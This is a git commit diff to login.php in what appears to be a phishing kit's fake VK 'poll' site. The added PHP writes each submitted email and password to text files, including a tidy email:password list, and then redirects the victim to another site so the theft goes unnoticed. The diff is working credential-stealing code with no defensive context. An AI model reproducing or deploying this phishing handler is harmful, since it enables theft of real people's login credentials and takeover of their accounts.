11e3bf7c12fda060b614dc1541e03fc891f2f663
MakarMS <makar.mikhalchenko@bk.ru>
2021-01-19 23:46:13 +0300

    Перевод ВК и доработка

--- .sites/vk_poll/login.php
+++ .sites/vk_poll/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://vk.com/restore/');
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_put_contents("usernames_sort.txt", "" . $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://photobattles.ru');
 exit();
-?>
